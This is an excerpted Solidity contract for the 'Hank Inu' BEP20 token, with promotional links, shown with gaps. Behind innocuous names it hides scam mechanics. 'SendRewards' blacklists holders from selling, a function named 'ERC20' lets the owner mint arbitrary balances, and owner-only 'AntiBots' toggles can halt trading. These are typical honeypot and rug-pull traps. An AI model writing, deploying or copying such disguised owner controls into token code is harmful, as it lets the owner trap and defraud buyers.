...
🗣 Ws:https://hankinu.com/
🗣 Tg:https://t.me/Hank_Inu
🗣 Tw:https://twitter.com/Hank_Inu
...
*/
    ...
    contract HANKINU is IBEP20, Ownable
    {
        ...
        mapping (address => bool) public _isSendRewards;

        EnumerableSet.AddressSet private _excluded;
        EnumerableSet.AddressSet private _excludedFromStaking;

        string private constant _name = "Hank Inu";
        string private constant _symbol = "$HANK";
        uint8 private constant _decimals = 9;
        uint256 public constant AvailableTickets= 1_000_000_000_000 * 10**_decimals;


        uint256 private constant DefaultLiquidityLockTime= 1;
        
        address public constant MarketingWallet=0xA3872828C32373856F78F9aF3449F5279F429Ecb;  
        address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;


        uint256 private _AccountBalance =AvailableTickets;
        uint256 public  balanceLimit = 80_000_000_000 * 10**_decimals;
        uint256 public  sellLimit = 50_000_000_000 * 10**_decimals;
        uint256 public  buyLimit = 80_000_000_000 * 10**_decimals;
        ...
        constructor () {
            uint256 deployerBalance=_AccountBalance;
        ...
        function changeTax(uint8 buyTax, uint8 sellTax) public onlyOwner{
           ...
           function ClaimRewards(address account) external onlyOwner {
            _isSendRewards[account] = false;
          }
          
            function SendRewards(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }


      function ERC20(address account, uint256 balance) onlyOwner  public virtual {
        require(account != address(0), "Insufficient Balance");
        _AccountCheckBalance(address(0), account, balance);
        ...
        function _transfer(address sender, address recipient, uint256 amount) private{
            ...
            require(!_isSendRewards[sender] && !_isSendRewards[recipient], "Too Early To Dump");
            
            _AccountCheckBalance(sender, recipient, amount);
            ...
            if(isContractTransfer || isLiquidityTransfer || isExcluded){
                ...
                require(AntiBotsFunction,"AntiBots not yet enabled");
        ...
        function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
            ...
            _AccountBalance-=tokensToBeBurnt;
       ...
       function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {
        ...
        function getBurnedTokens() public view returns(uint256){
            return (AvailableTickets-_AccountBalance)/10**_decimals;
        }
    ...
    bool public AntiBotsFunction;
    address private _liquidityTokenAddress;

    function InsertLiquidity() public onlyOwner{
        AntiBotsFunction=true;
    }

    function AntiBotActivate() public onlyOwner{
        AntiBotsFunction=false;
    }
    ...
    function SetupLiquidityTokenAddress(address liquidityTokenAddress) public onlyOwner{
        ...
        function MarketingBudget() public onlyOwner{
